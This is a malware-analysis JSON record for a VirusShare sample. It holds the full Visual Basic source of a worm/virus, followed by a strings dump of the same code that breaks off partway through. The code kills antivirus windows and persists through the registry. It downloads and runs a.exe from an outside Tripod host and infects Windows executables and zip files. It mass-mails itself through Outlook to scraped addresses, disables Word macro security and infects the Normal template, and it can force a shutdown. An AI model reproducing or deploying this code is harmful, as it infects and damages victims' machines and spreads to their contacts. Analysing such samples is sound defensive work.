{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AccessVBOM": "May attempt to disable VBA macro security and Protected View",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Binary": "May read or write a binary file",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "CreateObject": "May create an OLE object",
            "FileCopy": "May copy a file",
            "FindWindow": "May enumerate application windows",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Kill": "May delete a file",
            "Lib": "May run code from a DLL",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "Put": "May write to a file",
            "RtlMoveMemory": "May inject code into another process",
            "Shell": "May run an executable file or a system command",
            "VBProject": "May attempt to modify the VBA code",
            "WINDOWS": "May enumerate application windows",
            "WScript.Shell": "May run an executable file or a system command",
            "Write": "May write to a file",
            "codemodule": "May attempt to modify the VBA code",
            "document_close": "Runs when the Word document is closed",
            "document_open": "Runs when the Word or Publisher document is opened",
            "run": "May run an executable file or a system command",
            "shell32": "May run an executable file or a system command",
            "vbHide": "May run an executable file or a system command",
            "vbNormalFocus": "May run an executable file or a system command",
            "vbcomponents": "May attempt to modify the VBA code"
        },
        "macro": "Option Explicit\nPrivate Declare Sub CopyMemory Lib \"kernel32\" Alias \"RtlMoveMemory\" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)\nPrivate Declare Function GetCommandLine Lib \"kernel32\" Alias \"GetCommandLineA\" () As Long\nPrivate Declare Function lstrlen Lib \"kernel32\" Alias \"lstrlenA\" (ByVal lpString As Long) As Long\nPrivate Declare Function SHGetPathFromIDList Lib \"shell32.dll\" Alias \"SHGetPathFromIDListA\" (ByVal pidl As Long, ByVal pszPath As String) As Long\nPrivate Declare Function SHGetSpecialFolderLocation Lib \"shell32.dll\" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long\nPrivate Declare Function PostMessage Lib \"user32\" Alias \"PostMessageA\" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long\nPrivate Declare Function FindWindow Lib \"user32\" Alias \"FindWindowA\" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long\nPrivate Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long\nPrivate Declare Function OpenProcess Lib \"kernel32\" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long\nPrivate Declare Function GetExitCodeProcess Lib \"kernel32\" (ByVal hProcess As Long, lpExitCode As Long) As Long\nPrivate Declare Function CloseHandle Lib \"kernel32\" (ByVal hObject As Long) As Long\nPrivate Declare Function InternetGetConnectedState Lib \"wininet.dll\" (ByRef lpdwFlags As Long, ByVal dwReserved As Long) As Long\nPrivate iResult As Long\nPrivate hProg As Long\nPrivate idProg As Long\nPrivate iExit As Long\nConst WM_CLOSE = &H10\nConst STILL_ACTIVE As Long = &H103\nConst PROCESS_ALL_ACCESS As Long = &H1F0FFF\nConst EWX_SHUTDOWN = 1\nConst CSIDL_PERSONAL = &H5\nConst CSIDL_STARTUP = &H7\nConst CSIDL_TIF = &H20\nConst CSIDL_WIN = &H24\nConst CSIDL_WINSYS = &H25\nConst MAX_PATH = 260\nPrivate Type SHITEMID\n    cb As Long\n    abID As Byte\nEnd Type\nPrivate Type ITEMIDLIST\n    mkid As SHITEMID\nEnd Type\nSub Main()\nOn Error Resume Next\nDim vdir As String\nDim lenhost As String\nDim vc As String\nDim mark As String\nDim hostlen As String\nDim virlen As String\nDim buffhostlen As String\nDim buffvirlen As String\nCall regcall\nCall killav\nvdir = App.path\nIf Right(vdir, 1) <> \"\\\" Then vdir = vdir & \"\\\"\nFileCopy vdir & App.EXEName & \".exe\", GetSpecialfolder(CSIDL_WIN) & \"\\Ms0701i32.exe\"\nFileCopy vdir & App.EXEName & \".exe\", GetSpecialfolder(CSIDL_WINSYS) & \"\\lolita.exe\"\n'--------------- check if virus or worm ------------------------\nOpen vdir & App.EXEName & \".exe\" For Binary Access Read As #1\nlenhost = (LOF(1))\nvc = Space(lenhost)\nGet #1, , vc\nClose #1\nmark = Right(vc, 2)\nIf mark <> \"b8\" Then\n'worm\nCall extrkzip\nIf InStr(1, GetCommLine, \"-petikb8\") = 0 Then\nElse\nCall wording\nCall zipinfect\nEnd If\nIf InStr(1, GetCommLine, \"-alcopaulb8\") = 0 Then\nElse\nCall virustime\nEnd If\nIf InStr(1, GetCommLine, \"-trojanmode\") = 0 Then\nElse\nShutdownWindows EWX_SHUTDOWN\nEnd If\nlistht GetSpecialfolder(CSIDL_TIF)\nElse\n'virus : execute the host\nOpen vdir & App.EXEName & \".exe\" For Binary Access Read As #4\nhostlen = (LOF(4) - 75264)\nvirlen = (75264) 'worm/virus + zip component\nbuffhostlen = Space(hostlen)\nbuffvirlen = Space(virlen)\nGet #4, , buffvirlen\nGet #4, , buffhostlen\nClose #4\nOpen vdir & \"XxX.exe\" For Binary Access Write As #3\nPut #3, , buffhostlen\nClose #3\n'borrowed from murkry's vb5 virus\nidProg = Shell(vdir & \"XxX.exe\", vbNormalFocus)\nhProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)\nGetExitCodeProcess hProg, iExit\nDo While iExit = STILL_ACTIVE\nDoEvents\nGetExitCodeProcess hProg, iExit\nLoop\nKill vdir & \"XxX.exe\"\nEnd If\n'-------------------------------------------------------------------\nCall downloader\nEnd Sub\n'---------------------- kill avs --------------------------------------\nSub killav()\nOn Error Resume Next\nDim avn, avn1, avn2, avn3, avn4, avn5, avn6, avn7, avn8, avn9, avn10, avn11, avn12\nDim aWindow As Long\nDim angReturnValue As Long\nDim num3, arrr3, av\navn = \"Pop3trap\"\navn1 = \"JavaScan\"\navn2 = \"Modem Booster\"\navn3 = \"vettray\"\navn4 = \"Timer\"\navn5 = \"CD-Rom Monitor\"\navn6 = \"F-STOPW Version 5.06c\"\navn7 = \"PC-cillin 2000 : Virus Alert\"\navn8 = \"DAPDownloadManager\"\navn9 = \"Real-time Scan\"\navn10 = \"IOMON98\"\navn11 = \"AVP Monitor\"\navn12 = \"NAI_VS_STAT\"\nFor num3 = 0 To 12\narrr3 = Array(avn, avn1, avn2, avn3, avn4, avn5, avn6, avn7, avn8, avn9, avn10, avn11, avn12)\nav = arrr3(num3)\naWindow = FindWindow(vbNullString, av)\nangReturnValue = PostMessage(aWindow, WM_CLOSE, vbNull, vbNull)\nNext num3\nEnd Sub\n'-------------------------- download update and run it ----------------------\nSub downloader()\nOn Error Resume Next\nDim databyte() As Byte\nIf InternetGetConnectedState(0&, 0&) = 0 Then GoTo xIt\nForm1.Inet1.RequestTimeout = 40\ndatabyte() = Form1.Inet1.OpenURL(\"http://p0th0le.tripod.com/a.exe\", icByteArray)\nOpen \"c:\\update.exe\" For Binary Access Write As #2\nPut #2, , databyte()\nClose #2\nShell \"c:\\update.exe\", vbHide\nxIt:\nEnd Sub\n'----------------------c:\\WINDOWS file infection----------------\nSub virustime()\nOn Error Resume Next\nDim vdir As String\nDim sfile As String\nDim a As String\nDim arr1\nDim lenhost As String\nDim vc As String\nDim mark As String\nDim host\nvdir = App.path\nIf Right(vdir, 1) <> \"\\\" Then vdir = vdir & \"\\\"\nsfile = dir$(GetSpecialfolder(CSIDL_WIN) & \"\\*.exe\")\nWhile sfile <> \"\"\na = a & sfile & \"/\"\nsfile = dir$\nWend\narr1 = Split(a, \"/\")\nFor Each host In arr1\nOpen GetSpecialfolder(CSIDL_WIN) & \"\\\" & host For Binary Access Read As #1\nlenhost = (LOF(1))\nvc = Space(lenhost)\nGet #1, , vc\nClose #1\nmark = Right(vc, 2)\nIf mark <> \"b8\" Then\nGoTo notinfected\nElse\nGoTo gggoop\nEnd If\nnotinfected:\ninfect (GetSpecialfolder(CSIDL_WIN) & \"\\\" & host)\nExit For\ngggoop:\nNext host\nEnd Sub\nFunction infect(hostpath As String)\nOn Error Resume Next\nDim ffile\nDim hostcode As String\nDim vir As String\nDim vircode As String\nDim header As String\nDim f As String\nvir = App.path\nIf Right(vir, 1) <> \"\\\" Then vir = vir & \"\\\"\nOpen hostpath For Binary Access Read As #1\nhostcode = Space(LOF(1))\nGet #1, , hostcode\nClose #1\nOpen vir & App.EXEName & \".exe\" For Binary Access Read As #2\nheader = Space(LOF(2))\nGet #2, , header\nClose #2\nf = \"b8\"\nOpen hostpath For Binary Access Write As #3\nPut #3, , header\nPut #3, , hostcode\nPut #3, , f\nClose #3\nEnd Function\n'--------------------zip infection-----------------------------\nSub zipinfect()\nOn Error Resume Next\nlist (\"c:\\\")\nEnd Sub\n\nSub list(dir)\nOn Error Resume Next\nDim fso, ssf, fil\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet ssf = fso.GetFolder(dir).SubFolders\nFor Each fil In ssf\ninfection (fil.path)\nlist (fil.path)\nNext\nEnd Sub\n\nSub infection(dir)\nDim fso, cf, fil, ext\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet cf = fso.GetFolder(dir).Files\nFor Each fil In cf\next = fso.GetExtensionName(fil.path)\next = LCase(ext)\nIf (ext = \"zip\") Then\nShell \"c:\\piss.exe \" & fil.path & \" \" & GetSpecialfolder(CSIDL_WINSYS) & \"\\lolita.exe\", vbHide\nEnd If\nNext\nEnd Sub\n'--------------------trojan mode payload-----------------------------\nSub ShutdownWindows(ByVal intParamater As Integer)\nDim blnReturn As Boolean\nblnReturn = ExitWindowsEx(intParamater, 0)\nEnd Sub\n'--------------------variable commandline-----------------------------\nSub regcall()\nOn Error Resume Next\nDim b As String, c As String, d As String, ws As Object\nDim regcol, final\nSet ws = CreateObject(\"WScript.Shell\")\nb = \"-alcopaulb8\"\nc = \"-petikb8\"\nd = \"-trojanmode\"\nregcol = Array(b, c, d)\nRandomize\nfinal = regcol(Int(Rnd * 3))\nws.regwrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\\b8\", GetSpecialfolder(CSIDL_WINSYS) & \"\\Ms0701i32.exe \" & final\nIf dir(\"c:\\regedit.exe\") <> \"regedit.exe\" Then\nFileCopy GetSpecialfolder(CSIDL_WIN) & \"\\regedit.exe\", \"c:\\regedit.exe\"\nEnd If\nEnd Sub\n'--------------------extract zip software-----------------------------\nSub extrkzip()\nOn Error Resume Next\nDim vdir As String\nDim wormlen As String\nDim rarlen As String\nDim buffwormlen As String\nDim buffrarlen As String\nvdir = App.path\nIf Right(vdir, 1) <> \"\\\" Then vdir = vdir & \"\\\"\nOpen vdir & App.EXEName & \".exe\" For Binary Access Read As #1\nwormlen = (LOF(1) - 63488)\nrarlen = (63488)\nbuffwormlen = Space(wormlen)\nbuffrarlen = Space(rarlen)\nGet #1, , buffwormlen\nGet #1, , buffrarlen\nClose #1\nOpen \"c:\\piss.exe\" For Binary Access Write As #2\nPut #2, , buffrarlen\nClose #2\nShell \"c:\\piss.exe c:\\brigada8.zip \" & vdir & App.EXEName & \".exe\", vbHide\nEnd Sub\n'--------------------e-mail collect and e-mailing-----------------------------\nSub listht(dir)\nOn Error Resume Next\nDim fso, ssfh, filh\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet ssfh = fso.GetFolder(dir).SubFolders\nFor Each filh In ssfh\ninfht (filh.path)\nlistht (filh.path)\nNext\nEnd Sub\n\nSub infht(dir)\nDim mlto As String\nDim fso, cfh, filh, ext, textline, q\nDim j As Long, cnt As Long\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet cfh = fso.GetFolder(dir).Files\nFor Each filh In cfh\next = fso.GetExtensionName(filh.path)\next = LCase(ext)\nIf (ext = \"htm\") Or (ext = \"html\") Then\nOpen filh.path For Input As #1\nDo While Not EOF(1)\nLine Input #1, textline\nq = q & textline\nLoop\nClose #1\nFor j = 1 To Len(q)\nIf Mid(q, j, 7) = \"mailto:\" Then\nmlto = \"\"\ncnt = 0\nDo While Mid(q, j + 7 + cnt, 1) <> \"\"\"\"\nmlto = mlto + Mid(q, j + 7 + cnt, 1)\ncnt = cnt + 1\nLoop\nCall Worming(mlto)\nEnd If\nNext\nEnd If\nNext\nEnd Sub\nFunction Worming(mail As String)\nOn Error Resume Next\nDim a, b, c\nSet a = CreateObject(\"Outlook.Application\")\nSet b = a.GetNameSpace(\"MAPI\")\nIf a = \"Outlook\" Then\nb.Logon \"profile\", \"password\"\nSet c = a.CreateItem(0)\nc.Recipients.Add mail\nc.Subject = \"check us out\"\nc.Body = \"we exist to give everyone a smiley face... :)\"\nc.Attachments.Add \"c:\\brigada8.zip\"\nc.Send\nc.DeleteAfterSubmit = True\nb.Logoff\nEnd If\nEnd Function\n'--------------------commandline parser-----------------------------\nPrivate Function GetCommLine() As String\n    Dim RetStr As Long, SLen As Long\n    Dim Buffer As String\n    RetStr = GetCommandLine\n    SLen = lstrlen(RetStr)\n    If SLen > 0 Then\n        GetCommLine = Space$(SLen)\n        CopyMemory ByVal GetCommLine, ByVal RetStr, SLen\n    End If\nEnd Function\n'--------------------get special folder-----------------------------\nPrivate Function GetSpecialfolder(CSIDL As Long) As String\n    Dim r As Long\n    Dim IDL As ITEMIDLIST\n    Dim path As String\n    r = SHGetSpecialFolderLocation(100, CSIDL, IDL)\n    If r = 0 Then\n        path$ = Space$(512)\n        r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal path$)\n        GetSpecialfolder = Left$(path, InStr(path, Chr$(0)) - 1)\n        Exit Function\n    End If\n    GetSpecialfolder = \"\"\nEnd Function\n'------------------ document infection ---------------------------\nSub wording()\nOn Error Resume Next\nDim vdir As String\nvdir = App.path\nIf Right(vdir, 1) <> \"\\\" Then vdir = vdir & \"\\\"\nFileCopy vdir & App.EXEName & \".exe\", \"c:\\XXXview.exe\"\nOpen \"c:\\v.r\" For Output As #2\nPrint #2, \"REGEDIT4\"\nPrint #2, \"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security]\"\nPrint #2, \"\"\"Level\"\"=dword:00000001\"\nPrint #2, \"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security]\"\nPrint #2, \"\"\"Level\"\"=dword:00000001\"\nPrint #2, \"\"\"AccessVBOM\"\"=dword:00000001\"\nClose #2\nShell \"c:\\regedit.exe /s c:\\v.r\", vbHide\nKill \"c:\\v.r\"\nOpen \"c:\\nl.tmp\" For Output As #9\nPrint #9, \"Sub document_close()\"\nPrint #9, \"On Error Resume Next\"\nPrint #9, \"Open \"\"c:\\xp.exp\"\" For Output As 2\"\nPrint #9, \"Print #2, \"\"sub document_open()\"\"\"\nPrint #9, \"Print #2, \"\"On Error Resume Next\"\"\"\nPrint #9, \"Print #2, \"\"jbo = ActiveDocument.Shapes(1).OLEFormat.ClassType\"\"\"\nPrint #9, \"Print #2, \"\"With ActiveDocument.Shapes(1).OLEFormat\"\"\"\nPrint #9, \"Print #2, \"\"    .ActivateAs ClassType:=jbo\"\"\"\nPrint #9, \"Print #2, \"\"    .Activate\"\"\"\nPrint #9, \"Print #2, \"\"End With\"\"\"\nPrint #9, \"Print #2, \"\"end sub\"\"\"\nPrint #9, \"Close 2\"\nPrint #9, \"Set fso = CreateObject(\"\"Scripting.FileSystemObject\"\")\"\nPrint #9, \"Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule\"\nPrint #9, \"Set iw = fso.OpenTextFile(\"\"c:\\xp.exp\"\", 1, True)\"\nPrint #9, \"nt.DeleteLines 1, nt.CountOfLines\"\nPrint #9, \"i = 1\"\nPrint #9, \"Do While iw.atendofstream <> True\"\nPrint #9, \"b = iw.readline\"\nPrint #9, \"nt.InsertLines i, b\"\nPrint #9, \"i = i + 1\"\nPrint #9, \"Loop\"\nPrint #9, \"ActiveDocument.Shapes.AddOLEObject _\"\nPrint #9, \"FileName:=\"\"c:\\XXXview.exe\"\", _\"\nPrint #9, \"LinkToFile:=False\"\nPrint #9, \"ActiveDocument.Save\"\nPrint #9, \"Open \"\"c:\\b8.r\"\" For Output As #3\"\nPrint #9, \"Print #3, \"\"REGEDIT4\"\"\"\nPrint #9, \"Print #3, \"\"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security]\"\"\"\nPrint #9, \"Print #3, \"\"\"\"\"\"Level\"\"\"\"=dword:00000001\"\"\"\nPrint #9, \"Print #3, \"\"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security]\"\"\"\nPrint #9, \"Print #3, \"\"\"\"\"\"Level\"\"\"\"=dword:00000001\"\"\"\nPrint #9, \"Print #3, \"\"\"\"\"\"AccessVBOM\"\"\"\"=dword:00000001\"\"\"\nPrint #9, \"Close #3\"\nPrint #9, \"Shell \"\"c:\\regedit.exe /s c:\\b8.r\"\", vbHide\"\nPrint #9, \"Kill \"\"c:\\b8.r\"\"\"\nPrint #9, \"End Sub\"\nClose #9\nOpen GetSpecialfolder(CSIDL_STARTUP) & \"\\startup.vbs\" For Output As #6\nPrint #6, \"On Error Resume Next\"\nPrint #6, \"Set fso = CreateObject(\"\"Scripting.FileSystemObject\"\")\"\nPrint #6, \"Set oword = CreateObject(\"\"Word.Application\"\")\"\nPrint #6, \"oword.Visible = False\"\nPrint #6, \"Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule\"\nPrint #6, \"Set iw = fso.OpenTextFile(\"\"c:\\nl.tmp\"\", 1, True)\"\nPrint #6, \"nt.DeleteLines 1, nt.CountOfLines\"\nPrint #6, \"i = 1\"\nPrint #6, \"Do While iw.atendofstream <> True\"\nPrint #6, \"b = iw.readline\"\nPrint #6, \"nt.InsertLines i, b\"\nPrint #6, \"i = i + 1\"\nPrint #6, \"Loop\"\nPrint #6, \"oword.NormalTemplate.Save\"\nPrint #6, \"oword.NormalTemplate.Close\"\nPrint #6, \"oword.quit\"\nClose #6\nEnd Sub"
    },
    "filename": "VirusShare_084d82431a296b27dc18cce0175c5bd0",
    "filesize": 14139,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "084d82431a296b27dc18cce0175c5bd0",
        "sha1": "93d3c412173eec6e079967a9cd5dcf47d9482b77",
        "sha256": "349ccc0ef543ca0dd9c841855499708ce9bac74239d1553de9b6f7a04b3570b0"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "Attribute VB_Name = \"Module1\"",
            "Option Explicit",
            "Private Declare Sub CopyMemory Lib \"kernel32\" Alias \"RtlMoveMemory\" (pDst As Any, pSrc As Any, ByVal ByteLen As Long)",
            "Private Declare Function GetCommandLine Lib \"kernel32\" Alias \"GetCommandLineA\" () As Long",
            "Private Declare Function lstrlen Lib \"kernel32\" Alias \"lstrlenA\" (ByVal lpString As Long) As Long",
            "Private Declare Function SHGetPathFromIDList Lib \"shell32.dll\" Alias \"SHGetPathFromIDListA\" (ByVal pidl As Long, ByVal pszPath As String) As Long",
            "Private Declare Function SHGetSpecialFolderLocation Lib \"shell32.dll\" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long",
            "Private Declare Function PostMessage Lib \"user32\" Alias \"PostMessageA\" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long",
            "Private Declare Function FindWindow Lib \"user32\" Alias \"FindWindowA\" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long",
            "Private Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long",
            "Private Declare Function OpenProcess Lib \"kernel32\" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long",
            "Private Declare Function GetExitCodeProcess Lib \"kernel32\" (ByVal hProcess As Long, lpExitCode As Long) As Long",
            "Private Declare Function CloseHandle Lib \"kernel32\" (ByVal hObject As Long) As Long",
            "Private Declare Function InternetGetConnectedState Lib \"wininet.dll\" (ByRef lpdwFlags As Long, ByVal dwReserved As Long) As Long",
            "Private iResult As Long",
            "Private hProg As Long",
            "Private idProg As Long",
            "Private iExit As Long",
            "Const WM_CLOSE = &H10",
            "Const STILL_ACTIVE As Long = &H103",
            "Const PROCESS_ALL_ACCESS As Long = &H1F0FFF",
            "Const EWX_SHUTDOWN = 1",
            "Const CSIDL_PERSONAL = &H5",
            "Const CSIDL_STARTUP = &H7",
            "Const CSIDL_TIF = &H20",
            "Const CSIDL_WIN = &H24",
            "Const CSIDL_WINSYS = &H25",
            "Const MAX_PATH = 260",
            "Private Type SHITEMID",
            "    cb As Long",
            "    abID As Byte",
            "End Type",
            "Private Type ITEMIDLIST",
            "    mkid As SHITEMID",
            "End Type",
            "Sub Main()",
            "On Error Resume Next",
            "Dim vdir As String",
            "Dim lenhost As String",
            "Dim vc As String",
            "Dim mark As String",
            "Dim hostlen As String",
            "Dim virlen As String",
            "Dim buffhostlen As String",
            "Dim buffvirlen As String",
            "Call regcall",
            "Call killav",
            "vdir = App.path",
            "If Right(vdir, 1) <> \"\\\" Then vdir = vdir & \"\\\"",
            "FileCopy vdir & App.EXEName & \".exe\", GetSpecialfolder(CSIDL_WIN) & \"\\Ms0701i32.exe\"",
            "FileCopy vdir & App.EXEName & \".exe\", GetSpecialfolder(CSIDL_WINSYS) & \"\\lolita.exe\"",
            "'--------------- check if virus or worm ------------------------",
            "Open vdir & App.EXEName & \".exe\" For Binary Access Read As #1",
            "lenhost = (LOF(1))",
            "vc = Space(lenhost)",
            "Get #1, , vc",
            "Close #1",
            "mark = Right(vc, 2)",
            "If mark <> \"b8\" Then",
            "'worm",
            "Call extrkzip",
            "If InStr(1, GetCommLine, \"-petikb8\") = 0 Then",
            "Else",
            "Call wording",
            "Call zipinfect",
            "End If",
            "If InStr(1, GetCommLine, \"-alcopaulb8\") = 0 Then",
            "Else",
            "Call virustime",
            "End If",
            "If InStr(1, GetCommLine, \"-trojanmode\") = 0 Then",
            "Else",
            "ShutdownWindows EWX_SHUTDOWN",
            "End If",
            "listht GetSpecialfolder(CSIDL_TIF)",
            "Else",
            "'virus : execute the host",
            "Open vdir & App.EXEName & \".exe\" For Binary Access Read As #4",
            "hostlen = (LOF(4) - 75264)",
            "virlen = (75264) 'worm/virus + zip component",
            "buffhostlen = Space(hostlen)",
            "buffvirlen = Space(virlen)",
            "Get #4, , buffvirlen",
            "Get #4, , buffhostlen",
            "Close #4",
            "Open vdir & \"XxX.exe\" For Binary Access Write As #3",
            "Put #3, , buffhostlen",
            "Close #3",
            "'borrowed from murkry's vb5 virus",
            "idProg = Shell(vdir & \"XxX.exe\", vbNormalFocus)",
            "hProg = OpenProcess(PROCESS_ALL_ACCESS, False, idProg)",
            "GetExitCodeProcess hProg, iExit",
            "Do While iExit = STILL_ACTIVE",
            "DoEvents",
            "GetExitCodeProcess hProg, iExit",
            "Loop",
            "Kill vdir & \"XxX.exe\"",
            "End If",
            "'-------------------------------------------------------------------",
            "Call downloader",
            "End Sub",
            "'---------------------- kill avs --------------------------------------",
            "Sub killav()",
            "On Error Resume Next",
            "Dim avn, avn1, avn2, avn3, avn4, avn5, avn6, avn7, avn8, avn9, avn10, avn11, avn12",
            "Dim aWindow As Long",
            "Dim angReturnValue As Long",
            "Dim num3, arrr3, av",
            "avn = \"Pop3trap\"",
            "avn1 = \"JavaScan\"",
            "avn2 = \"Modem Booster\"",
            "avn3 = \"vettray\"",
            "avn4 = \"Timer\"",
            "avn5 = \"CD-Rom Monitor\"",
            "avn6 = \"F-STOPW Version 5.06c\"",
            "avn7 = \"PC-cillin 2000 : Virus Alert\"",
            "avn8 = \"DAPDownloadManager\"",
            "avn9 = \"Real-time Scan\"",
            "avn10 = \"IOMON98\"",
            "avn11 = \"AVP Monitor\"",
            "avn12 = \"NAI_VS_STAT\"",
            "For num3 = 0 To 12",
            "arrr3 = Array(avn, avn1, avn2, avn3, avn4, avn5, avn6, avn7, avn8, avn9, avn10, avn11, avn12)",
            "av = arrr3(num3)",
            "aWindow = FindWindow(vbNullString, av)",
            "angReturnValue = PostMessage(aWindow, WM_CLOSE, vbNull, vbNull)",
            "Next num3",
            "End Sub",
            "'-------------------------- download update and run it ----------------------",
            "Sub downloader()",
            "On Error Resume Next",
            "Dim databyte() As Byte",
            "If InternetGetConnectedState(0&, 0&) = 0 Then GoTo xIt",
            "Form1.Inet1.RequestTimeout = 40",
            "databyte() = Form1.Inet1.OpenURL(\"http://p0th0le.tripod.com/a.exe\", icByteArray)",
            "Open \"c:\\update.exe\" For Binary Access Write As #2",
            "Put #2, , databyte()",
            "Close #2",
            "Shell \"c:\\update.exe\", vbHide",
            "xIt:",
            "End Sub",
            "'----------------------c:\\WINDOWS file infection----------------",
            "Sub virustime()",
            "On Error Resume Next",
            "Dim vdir As String",
            "Dim sfile As String",
            "Dim a As String",
            "Dim arr1",
            "Dim lenhost As String",
            "Dim vc As String",
            "Dim mark As String",
            "Dim host",
            "vdir = App.path",
            "If Right(vdir, 1) <> \"\\\" Then vdir = vdir & \"\\\"",
            "sfile = dir$(GetSpecialfolder(CSIDL_WIN) & \"\\*.exe\")",
            "While sfile <> \"\"",
            "a = a & sfile & \"/\"",
            "sfile = dir$",
            "Wend",
            "arr1 = Split(a, \"/\")",
            "For Each host In arr1",
            "Open GetSpecialfolder(CSIDL_WIN) & \"\\\" & host For Binary Access Read As #1",
            "lenhost = (LOF(1))",
            "vc = Space(lenhost)",
            "Get #1, , vc",
            "Close #1",
            "mark = Right(vc, 2)",
            "If mark <> \"b8\" Then",
            "GoTo notinfected",
            "Else",
            "GoTo gggoop",
            "End If",
            "notinfected:",
            "infect (GetSpecialfolder(CSIDL_WIN) & \"\\\" & host)",
            "Exit For",
            "gggoop:",
            "Next host",
            "End Sub",
            "Function infect(hostpath As String)",
            "On Error Resume Next",
            "Dim ffile",
            "Dim hostcode As String",
            "Dim vir As String",
            "Dim vircode As String",
            "Dim header As String",
            "Dim f As String",
            "vir = App.path",
            "If Right(vir, 1) <> \"\\\" Then vir = vir & \"\\\"",
            "Open hostpath For Binary Access Read As #1",
            "hostcode = Space(LOF(1))",
            "Get #1, , hostcode",
            "Close #1",
            "Open vir & App.EXEName & \".exe\" For Binary Access Read As #2",
            "header = Space(LOF(2))",
            "Get #2, , header",
            "Close #2",
            "f = \"b8\"",
            "Open hostpath For Binary Access Write As #3",
            "Put #3, , header",
            "Put #3, , hostcode",
            "Put #3, , f",
            "Close #3",
            "End Function",
            "'--------------------zip infection-----------------------------",
            "Sub zipinfect()",
            "On Error Resume Next",
            "list (\"c:\\\")",
            "End Sub",
            "Sub list(dir)",
            "On Error Resume Next",
            "Dim fso, ssf, fil",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "Set ssf = fso.GetFolder(dir).SubFolders",
            "For Each fil In ssf",
            "infection (fil.path)",
            "list (fil.path)",
            "Next",
            "End Sub",
            "Sub infection(dir)",
            "Dim fso, cf, fil, ext",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "Set cf = fso.GetFolder(dir).Files",
            "For Each fil In cf",
            "ext = fso.GetExtensionName(fil.path)",
            "ext = LCase(ext)",
            "If (ext = \"zip\") Then",
            "Shell \"c:\\piss.exe \" & fil.path & \" \" & GetSpecialfolder(CSIDL_WINSYS) & \"\\lolita.exe\", vbHide",
            "End If",
            "Next",
            "End Sub",
            "'--------------------trojan mode payload-----------------------------",
            "Sub ShutdownWindows(ByVal intParamater As Integer)",
            "Dim blnReturn As Boolean",
            "blnReturn = ExitWindowsEx(intParamater, 0)",
            "End Sub",
            "'--------------------variable commandline-----------------------------",
            "Sub regcall()",
            "On Error Resume Next",
            "Dim b As String, c As String, d As String, ws As Object",
            "Dim regcol, final",
            "Set ws = CreateObject(\"WScript.Shell\")",
            "b = \"-alcopaulb8\"",
            "c = \"-petikb8\"",
            "d = \"-trojanmode\"",
            "regcol = Array(b, c, d)",
            "Randomize",
            "final = regcol(Int(Rnd * 3))",
            "ws.regwrite \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\\b8\", GetSpecialfolder(CSIDL_WINSYS) & \"\\Ms0701i32.exe \" & final",
            "If dir(\"c:\\regedit.exe\") <> \"regedit.exe\" Then",
            "FileCopy GetSpecialfolder(CSIDL_WIN) & \"\\regedit.exe\", \"c:\\regedit.exe\"",
            "End If",
            "End Sub",
            "'--------------------extract zip software-----------------------------",
            "Sub extrkzip()",
            "On Error Resume Next",
            "Dim vdir As String",
            "Dim wormlen As String",
            "Dim rarlen As String",
            "Dim buffwormlen As String",
            "Dim buffrarlen As String",
            "vdir = App.path",
            "If Right(vdir, 1) <> \"\\\" Then vdir = vdir & \"\\\"",
            "Open vdir & App.EXEName & \".exe\" For Binary Access Read As #1",
            "wormlen = (LOF(1) - 63488)",
            "rarlen = (63488)",
            "buffwormlen = Space(wormlen)",
            "buffrarlen = Space(rarlen)",
            "Get #1, , buffwormlen",
            "Get #1, , buffrarlen",
            "Close #1",
            "Open \"c:\\piss.exe\" For Binary Access Write As #2",
            "Put #2, , buffrarlen",
            "Close #2",
            "Shell \"c:\\piss.exe c:\\brigada8.zip \" & vdir & App.EXEName & \".exe\", vbHide",
            "End Sub",
            "'--------------------e-mail collect and e-mailing-----------------------------",
            "Sub listht(dir)",
            "On Error Resume Next",
            "Dim fso, ssfh, filh",
            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "Set ssfh = fso.GetFolder(dir).SubFolders",
            "For Each filh In ssfh",
            "infht (filh.path)",
            "listht (filh.path)",
            "Next",
            "End Sub",
            "Sub infht(dir)",
            "Dim mlto As String",
            "Dim fso, cfh, filh, ext, textline, q",
            "Dim j As Long, cnt As Long",
